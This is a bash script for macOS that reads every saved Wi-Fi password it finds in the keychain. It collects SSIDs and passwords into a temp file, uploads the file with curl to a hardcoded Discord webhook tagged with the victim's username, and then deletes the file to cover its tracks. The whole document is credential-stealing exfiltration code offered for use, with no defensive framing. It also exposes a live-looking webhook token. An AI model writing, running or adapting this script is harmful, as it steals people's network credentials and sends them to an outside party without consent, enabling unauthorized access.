#!/bin/bash

# Variables
dc="https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
temp_file="/tmp/wifi-pass.txt"

# Function to upload files to Discord
function discord_upload() {
  local file_path=$1

  curl -s -X POST "$dc" \
    -F "username=$(whoami)" \
    -F "file1=@$file_path"
}

# Retrieve Wi-Fi passwords
echo "Script started"
echo "Gathering Wi-Fi profiles..." > "$temp_file"
IFS=$'\n'
for ssid in $(networksetup -listallhardwareports | awk '/Wi-Fi/{getline; print}' | awk '{print $2}'); do
  for network in $(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | awk 'NR > 1 {print $1}'); do
    security find-generic-password -D "AirPort network password" -a $network -w &> /dev/null
    if [ $? -eq 0 ]; then
      echo "SSID: $network" >> "$temp_file"
      echo "Password: $(security find-generic-password -D 'AirPort network password' -a $network -w)" >> "$temp_file"
    fi
  done
done

# Upload to Discord
echo "Uploading to Discord..."
discord_upload "$temp_file"
echo "Upload to Discord completed"

# Cleanup
echo "Cleaning up..."
rm "$temp_file"
echo "Cleanup completed"
